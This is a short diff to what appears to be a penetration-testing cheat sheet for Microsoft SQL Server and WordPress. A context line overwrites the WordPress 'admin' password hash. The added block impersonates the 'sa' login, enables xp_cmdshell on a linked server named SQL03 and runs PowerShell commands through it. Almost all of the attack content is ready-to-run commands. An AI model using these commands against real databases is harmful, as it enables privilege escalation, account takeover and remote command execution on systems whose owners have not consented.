@@ -137,4 +137,12 @@ List columns inside specific table :
 Update specific column:
 - `update wordpress..wp_users set user_pass = '$P$BAyzjPk37CdiX/e/XxwB9I7wZgBG8Q/' WHERE user_login = 'admin';`
 
+Impersonate SA on linked server and execute commands:
+```
+-- Switch to sa only if needed
+EXECUTE AS LOGIN = 'sa';
+EXEC('sp_configure ''show advanced options'',1; RECONFIGURE') AT SQL03;
+exec ('EXEC sp_configure ''xp_cmdshell'',1 RECONFIGURE') at SQL03
+EXEC('xp_cmdshell ''powershell whoami''') AT SQL03;
+```
 
